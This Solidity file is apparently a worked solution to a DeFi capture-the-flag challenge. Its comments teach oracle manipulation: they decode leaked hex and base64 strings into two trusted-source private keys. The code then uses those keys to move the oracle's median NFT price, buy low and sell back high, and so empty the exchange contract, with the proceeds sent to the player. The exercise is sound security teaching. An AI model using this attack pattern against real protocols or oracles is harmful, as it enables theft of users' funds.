// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

// The player may not have access to the original contracts, so the
// player should use these or other interfaces.
import { IExchange } from "./Interfaces/IExchange.i.sol";
import { ITrustfulOracle } from "./Interfaces/ITrustfulOracle.i.sol";
import { ITrustfulOracleInitializer } from "./Interfaces/ITrustfulOracleInitializer.i.sol";

import { IEOARunner } from "./Interfaces/IEOARunner.i.sol";
import { DamnValuableNFT } from "../DamnValuableNFT.sol";

contract TheOraclesProphecy {
    address private player;
    IEOARunner private eoaCaller;
    IExchange private exchange;
    ITrustfulOracle private oracle;
    ITrustfulOracleInitializer private oracleInitializer;
    DamnValuableNFT private nftToken;

    address[] private TRUSTED_SOURCES = [
        0xA73209FB1a42495120166736362A1DfA9F95A105,
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
    ];

    uint256 private constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 private constant INITIAL_NFT_PRICE = 999 ether;
    uint256 private constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 private constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    constructor(address _exchange, address _oracleInitializer, address _eoa, address _player) payable {
        player = _player;
        eoaCaller = IEOARunner(payable(_eoa));
        exchange = IExchange(payable(_exchange));
        oracle = ITrustfulOracle(payable(address(exchange.oracle())));
        oracleInitializer = ITrustfulOracleInitializer(payable(address(_oracleInitializer)));
        nftToken = DamnValuableNFT(payable(address(exchange.token())));
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // As before, while the challenge text says the player starts with
        // 0.1 eth, we have put that 0.1 eth into this contract for you to
        // use instead.

        // You may need to send a transaction as an EOA account. While normally
        // this would not be possible inside a contract, we have taken advantage
        // of Foundry's "cheat codes" to implement a function you can use inside
        // here to send that transaction. If you look in the IEOARunner interface
        // file, you will find the function "RunAsEOA()" and a description for
        // how to use it.

        // Additionally, you may or may not need to create extra functions in
        // this contract, or another contract that you deploy from this contract
        // or from the test. As always, you are free to modify this contract to
        // suit your needs and/or create additional contracts.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // The solution for this challenge depends on a class of vulnerabilities
        // called "oracle manipulation". Basically, when an exchange, lending
        // platform, or any other defi platform relies on pricing info (or other
        // valuable information) from an external contract, you might be able
        // to exploit the defi platform by attacking the oracle instead of the
        // platform. By changing the data the oracle provides, you can crash a
        // market, by something for cheap, or do any number of other things.

        // In this case, the exchange and oralce aren't directly attackable, but
        // the web2 vulnerability is leaking private keys. Those private keys
        // turn out to be the private keys for two of the three "trusted" oracle
        // sources, which have the ability to set the price that the oracle provides
        // to the exchange.

        // Generally, this kind of setup has a bot or other program monitoring
        // external data feeds, and then using a private key for an EOA account
        // to update the price in the contract. That's not inherently dangerous,
        // but it creates many new complexities, and bridges the security concerns
        // of web2 and web3 together, making everything more difficult. And in
        // this instance, it appears the web2 program has a publicly available
        // endpoint where it provides the private keys it uses.

        // Since the exchange buys and sells NFTs based on the price of the oracle,
        // we can use that to crash the price, buy an NFT cheaply, raise the price,
        // and then sell it back to the exchange at the higher price. Ideally,
        // we will sell it back for all the money the exchange has! (This allows
        // us to steal all of the exchange's money.)

        // The first step is recognizing that the web server response is private
        // keys. Anybody in IT will be able to recognize that the hex data looks
        // likely to be ASCII text, and even if you don't, that is generally the
        // first thing you look for.

        // The two hex strings:

        // 4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a5534
        // 4e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a4269
        // 5a6a426a4f575a69593252685a544a6d4e44637a4e574535

        // and

        // 4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f575532
        // 4f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c
        // 4f5467334e575a69593251334d7a597a4e444269596a5134

        // decode into the two ascii text values:

        // MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBi
        // ZjBjOWZiY2RhZTJmNDczNWE5

        // and

        // MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFl
        // OTg3NWZiY2Q3MzYzNDBiYjQ4

        // which the trained eye will again recognize, this time as possibly
        // being base64 text. Indeed those texts are valid base64, and decode
        // to the following texts:

        // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

        // and

        // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

        // Hopefully, as a defi developer, you also recognize those values.
        // They are private keys!

        // Since you are using Foundry, we can use the "cast" software to
        // determine what addresses they belong to.
        // Running "cast wallet address 0x..." on the two keys gives us:

        // 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
        // 0x81A5D6E50C214044bE44cA0CB057fe119097850c

        // which match two of the three accounts that can set the price on
        // the oracle.

        // The exchange contract is simple and only has buyOne() and sellOne()
        // functions, which call "oracle.getMedianPrice()" in order to determine
        // the trade price. Looking at the oracle contract, that function calls
        // the function "_computeMedianPrice()" which tells us how the price is
        // determined. It gets a list of all prices, each one individually given
        // by a trusted address, and then takes the middle value in that list.
        // (Or if the list has an even number of items, it takes the average of
        // the middle two values.) Since we can see there are three addresses
        // providing values, we know it will take the middle item. This means
        // we will have to modify the price with both of the private keys, in
        // in order to create a lower/higher value on one side of the list, and
        // then also a middle value that the oracle will actually use.

        // Having taken control of the price feed provided by the oracle, we
        // will buy an NFT cheaply using the buyOne() function, and then sell
        // it back for a higher price using the sellOne() function.

        // So, our first step is to set a low price. We start with 0.1 ether,
        // so that price or lower will suffice. We will use the special
        // "RunAsEOA()" function in order to simulate sending a separate
        // transaction from the private keys.

        // First, we will set a price lower than 0.1, so that 0.1 ends up
        // being the median price.

        bool success = eoaCaller.RunAsEOA(
            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
            address(oracle),
            abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", 0.05 ether)
        );
        require(success, "External call 1 failed");

        // Next we use the other account to set the middle price.
        success = eoaCaller.RunAsEOA(
            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
            address(oracle),
            abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", 0.1 ether)
        );
        require(success, "External call 2 failed");

        // Now we buy a cheap NFT for the median price of 0.1 ether.
        uint256 nftId = exchange.buyOne{ value: 0.1 ether }();

        // The ERC721 standard requires that contracts which receive an NFT
        // must implement the function "onERC721Received()" which is why
        // we implement it below. If we did not have this function, the
        // buyone() call would fail.

        // Next we set the median price to the total money in the exchange.
        // In order for the median price to be all of the exchange's money,
        // the first price we set must be even higher than that.
        uint256 firstPrice = address(exchange).balance + 1;

        // Median price
        uint256 secondPrice = address(exchange).balance;

        success = eoaCaller.RunAsEOA(
            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
            address(oracle),
            abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", firstPrice)
        );
        require(success, "External call 3 failed");

        success = eoaCaller.RunAsEOA(
            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
            address(oracle),
            abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", secondPrice)
        );
        require(success, "External call 4 failed");

        // Now we can sell back the NFT to the exchange for all of its money.
        // However, because the exchange uses the ERC721 transferFrom() function,
        // we first must approve the NFT transfer.
        nftToken.approve(address(exchange), nftId);
        exchange.sellOne(nftId);

        // The challenge requires we empty the exchange, and also set the oracle
        // prices back to what they were. So our last step is to do that:

        success = eoaCaller.RunAsEOA(
            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
            address(oracle),
            abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", INITIAL_NFT_PRICE)
        );
        require(success, "External call 5 failed");

        success = eoaCaller.RunAsEOA(
            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
            address(oracle),
            abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", INITIAL_NFT_PRICE)
        );
        require(success, "External call 6 failed");

        // I lied, we have one more step: transferring the money to the player
        // account.
        (success,) = player.call{ value: address(this).balance }("");
        require(success, "Transfer to player failed");

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=ecYTmC6tUXI
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        // We ignore all the input variables because we aren't using them.
        // There's nothing we need to do when we receive the NFTs. So we just
        // return the expected value.
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
